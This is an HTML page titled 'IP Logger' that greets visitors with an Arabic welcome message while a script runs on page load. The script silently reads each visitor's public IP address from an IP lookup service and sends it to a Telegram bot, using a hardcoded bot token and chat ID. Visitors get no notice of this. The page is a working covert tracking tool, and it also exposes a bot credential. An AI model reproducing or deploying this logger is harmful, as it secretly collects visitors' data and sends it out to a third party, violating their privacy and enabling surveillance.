<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <script>
        // معرف البوت وتوكين
        const botToken = "8100423476:AAEeEFgatBOHJb67WpgQjHJ-6FknwscHqW0";
        const chatId = "7622667358";

        // وظيفة لإرسال رسالة إلى تيليجرام
        async function sendToTelegram(message) {
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            try {
                await fetch(telegramUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error("فشل الإرسال إلى تيليجرام:", error);
            }
        }

        // الحصول على عنوان IP وإرساله
        async function logIp() {
            try {
                // استخدام خدمة API للحصول على IP
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                const ip = data.ip;

                // صياغة الرسالة وإرسالها
                const message = `تم تسجيل دخول جديد. عنوان IP هو: ${ip}`;
                sendToTelegram(message);
            } catch (error) {
                console.error("فشل الحصول على IP:", error);
            }
        }

        // تنفيذ الوظيفة عند تحميل الصفحة
        window.onload = logIp;
    </script>
</head>
<body>
    <h1>مرحبًا بك في موقعي!</h1>
</body>
</html>
